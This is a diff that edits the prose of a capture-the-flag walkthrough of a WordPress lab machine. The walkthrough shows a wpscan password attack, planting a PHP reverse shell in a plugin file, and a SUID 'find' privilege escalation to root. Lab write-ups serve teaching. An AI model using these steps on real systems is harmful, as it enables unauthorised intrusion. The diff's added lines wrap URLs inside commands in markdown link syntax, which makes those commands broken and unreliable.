@@ -9,7 +9,7 @@ nmap -sS -sV -Pn -p- 10.112.142.26
 ```
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap -sS -sV -Pn -p- 10.112.142.26                                     
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 06:23 EDT
+Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-05-18 06:23 EDT
 Nmap scan report for 10.112.142.26
 Host is up (0.027s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -18,14 +18,14 @@ PORT     STATE SERVICE VERSION
 4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
 Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds
 ```
 
-Once we head to the webpage, we can see that its hosted using Wordpress. First, we can enumerate wordpress users:
+Once we navigate to the webpage, we can see that it is hosted using WordPress. First, we can enumerate the WordPress users:
 
 ```
-wpscan --url http://10.112.142.26 --enumerate u
+wpscan --url [http://10.112.142.26](http://10.112.142.26) --enumerate u
 ```
 
 ```
@@ -51,17 +51,17 @@ wpscan --url http://10.112.142.26 --enumerate u
  ...
 ```
 
-As we can see, we have found some users. Now we can try to launch an dictionary attack on these usernames (specifically c0ldd username):
+As we can see, we have successfully found several users. Now, we can try to launch a dictionary attack against these usernames (specifically the `c0ldd` username):
 
 ```
-wpscan --url http://10.112.142.26 --usernames c0ldd --passwords ../rockyou.txt
+wpscan --url [http://10.112.142.26](http://10.112.142.26) --usernames c0ldd --passwords ../rockyou.txt
 ```
 
 ```
 ...
 
 [+] Performing password attack on Wp Login against 1 user/s
-[SUCCESS] - c0ldd / 9876543210                                                                                                                               
+[SUCCESS] - c0ldd / 9876543210                                                                                                                                                 
 Trying c0ldd / photos Time: 00:00:19 <                                                                              > (1225 / 14345617)  0.00%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
@@ -70,7 +70,7 @@ Trying c0ldd / photos Time: 00:00:19 <                                          
 ...
 ```
 
-We found valid credentials, so now we can login to the Wordpress panel. We can see that we have access to the file editor, so we can paste php reverse shell to the akismet/class.akismet.php, and access the file at the wp-content/plugins/akismet/class.akismet.php path.
+We found valid credentials, so we can now log in to the WordPress dashboard. We can see that we have access to the file editor, which allows us to paste a PHP reverse shell into `akismet/class.akismet.php` and access the file via the `wp-content/plugins/akismet/class.akismet.php` path.
 
 ![alt text](../assets/colddboxeasy1.png)
 
@@ -91,13 +91,13 @@ ColddBox-Easy
 $ 
 ```
 
-Next we upgrade our shell:
+Next, we upgrade our shell:
 
 ```
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-We can look for binaries with SETUID flag set:
+We can look for binaries with the SUID flag set:
 
 ```
 find / -perm -u=s -type f 2>/dev/null
@@ -131,7 +131,7 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-We can see that there is `find` binary listed in the output. We head to https://gtfobins.org/gtfobins/find/ and copy the command which gives us the root shell:
+We can see that the `find` binary is listed in the output. We head to https://gtfobins.org/gtfobins/find/ and copy the command that grants a root shell:
 
 ```
 find . -exec /bin/sh -p \; -quit
@@ -146,7 +146,7 @@ root
 # 
 ```
 
-Now we can read user.txt and root.txt flags:
+Now we can read the `user.txt` and `root.txt` flags:
 
 ```
 # cd /home/c0ldd              
